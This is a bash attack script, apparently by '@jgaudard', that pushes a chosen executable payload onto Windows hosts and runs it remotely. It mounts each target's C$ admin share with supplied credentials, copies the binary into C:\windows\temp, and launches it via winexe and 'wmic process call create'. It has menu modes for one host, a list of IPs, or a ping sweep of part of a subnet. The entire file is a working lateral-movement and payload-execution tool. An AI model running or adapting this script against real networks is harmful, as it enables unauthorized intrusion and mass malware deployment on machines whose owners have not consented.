#!/bin/bash

#################################################
# Created by @jgaudard  :: I don't twitter much 
# Used wmic to execute an exe payload.
# Created: 18 June 2016    Edited: 23 June 2016
# Version 3.0
#################################################

clear
which winexe || echo "You need winexe to run this script"
which mount.cifs || echo "You need mount.cifs to run this script, apt-get install cifs-utils to install"
sleep 5
clear
echo "     Menu     "
echo "How are you selecting targets?`echo $'\n '`"
echo "   Exit... I'm a noob. (0)"
echo "   One shot wonder. (1)"
echo "   Multiple. (2)"
echo "   Entire subnet. (3)"
read -p ": " menu
clear

if [ $menu == 0 ]; then
	echo "Exiting...."
	exit
fi

read -p "What is the local path of the binary?: " lpath
read -p "What is the name of your binary?: " binary
read -p "Checking for /mnt/targetdrive, ctrl+c to excape."

[ -f /mnt/targetdrive ] && echo "/mnt/targetdrive already exists. Going to mount target drive to this path." || echo "Creating and mounting /mnt/targetdrive"; mkdir -p /mnt/targetdrive

if [ $menu == 1 ]; then
	read -p "What is the target host's IP?: " ipaddy
	read -p "What is the targets username?: " username
	read -p "What is the targets password?: " password

	mount.cifs //$ipaddy/C$ /mnt/targetdrive -o user=$username,password=$password

	cp $lpath/$binary /mnt/targetdrive/windows/temp 
	winexe -U "$username%$password" //$ipaddy ipconfig
	winexe -U "$username%$password" //$ipaddy "wmic os list brief"
	winexe -U "$username%$password" //$ipaddy "wmic process call create c:\\windows\\temp\\$binary"
	umount /mnt/targetdrive
	exit 1;
elif [ $menu == 2 ]; then
	echo "Enter ip addresses separated by a space ie."
	echo "192.168.1.33 177.33.1.5 1.40.33.37"
	read -p ": " multiip
	read -p "Username: " username
	read -p "Password: " password

	for ip in $multiip ; do
		mount.cifs //$ip/C$ /mnt/targetdrive -o user="$username",password="$password"
        	cp $lpath/$binary /mnt/targetdrive/windows/temp
       		winexe -U "$username%$password" //$ip ipconfig
        	winexe -U "$username%$password" //$ip "wmic os list brief"
       		winexe -U "$username%$password" //$ip "wmic process call create c:\\windows\\temp\\$binary"
        	umount /mnt/targetdrive
	done
	exit 0;
elif [ $menu == 3 ]; then
	echo "Enter the username."
	read -p ": " username
	echo "Enter the password."
	read -p ": " password
	echo "Enter the subnet, ie 192.168.1 or 172.16.5"
	read -p ": " subnet
	for ip in {43..66}; do
		ping -c 1 $subnet.$ip || continue
		mount.cifs //$subnet.$ip/C$ /mnt/targetdrive -o user="$username",password="$password"
        	cp $lpath/$binary /mnt/targetdrive/windows/temp 
	        winexe -U "$username%$password" //$subnet.$ip ipconfig
	        winexe -U "$username%$password" //$subnet.$ip "wmic os list brief"
	        winexe -U "$username%$password" //$subnet.$ip "wmic process call create c:\\windows\\temp\\$binary"
	        umount /mnt/targetdrive
	done		
	exit 0;

else
	echo "Invalid option."

fi
exit 0
